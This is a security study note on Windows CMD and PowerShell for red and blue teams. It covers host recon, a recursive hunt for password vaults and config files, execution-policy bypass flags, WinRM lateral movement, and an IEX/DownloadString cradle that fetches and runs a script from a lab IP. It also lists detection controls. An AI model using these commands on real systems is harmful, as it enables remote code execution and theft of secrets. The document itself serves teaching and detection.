---
title: "Windows CLI CMD and PowerShell"
aliases: ["CMD", "PowerShell", "WinRM", "Execution Policy", "PowerShell Remoting"]
tags:
  - tree/os
  - cyber/foundations/windows
  - type/technique
  - level/operator
Domain:
  - "[[Windows]]"
Color: "#FFA500"
---

# 🪟 Windows CLI: CMD and PowerShell

> [!abstract] Note of [[Windows]]
> Two shells live on every Windows box: legacy **`cmd.exe`** (text in/out) and **PowerShell** (.NET objects in/out). Fluency in both is how you enumerate a host and how defenders catch you.

> [!warning] Authorized use only
> Lateral-movement and download-cradle techniques below are for authorized engagements/labs, documented so blue teams can detect them.

## Command Prompt — fast host recon
| Command | Reveals |
| --- | --- |
| `whoami /all` | user, groups, **privileges** (`SeImpersonatePrivilege`!), SID |
| `systeminfo` | OS build + hotfixes → match public exploits |
| `ipconfig /all` · `arp -a` | network, DNS, domain, neighbours |
| `net user` · `net localgroup administrators` | users / local admins |
| `netstat -abon` | connections + owning PID (spot C2) |
| `sc query` · `tasklist /v` | services / processes |

## PowerShell — objects, not text
Cmdlets are **`Verb-Noun`** and pass live .NET objects, so you filter on real properties:
```powershell
Get-Process | Where-Object CPU -gt 100 | Sort-Object CPU -Desc | Select -First 5
Get-CimInstance Win32_Service | Where-Object State -eq 'Running'
Get-ChildItem C:\ -Recurse -Include *.kdbx,*.config -EA SilentlyContinue   # hunt secrets
```
Analogues: `Get-ChildItem`=`dir`/`ls`, `Get-Content`=`type`/`cat`, `Get-NetTCPConnection`=`netstat`, `Get-LocalUser`/`Get-ADUser`=`net user`.

## Execution policy — a speed bump, not a security boundary
`Get-ExecutionPolicy` gates *script files*, not pasted commands. It is trivially bypassed and **not** a security control:
```powershell
powershell -ep bypass -f script.ps1
powershell -ExecutionPolicy Bypass -EncodedCommand <base64>   # -enc
Get-Content script.ps1 | powershell -noprofile -              # pipe in
```

## Remoting (WinRM) — the lateral-movement highway
PowerShell Remoting runs over **WinRM** (5985/5986) and is the primary lateral path in a domain:
```powershell
Invoke-Command -ComputerName DC01 -ScriptBlock { whoami; hostname }
Enter-PSSession -ComputerName SRV02 -Credential (Get-Credential)   # interactive
```
A **download cradle** pulls and runs code straight from memory — beloved of admins and attackers alike:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.5/a.ps1')
```

> [!warning] Exactly what defenders watch for
> `IEX`, `DownloadString`, `-EncodedCommand`, and `-ep bypass` are classic signals. Blue teams enable **Script-Block Logging (EID 4104)**, **Module Logging**, **AMSI**, **Constrained Language Mode**, and **PowerShell Transcription** — covered in **Windows Logging and Auditing**.

> [!tip] Crook → Root
> **Crook** memorises `dir`. **Root** scripts the whole host triage in one PowerShell pipeline, knows execution policy is theatre, and reaches for WinRM to pivot — while understanding every one of those actions is logged if the defender configured it.

---
> 🔼 Up: [[Windows]]
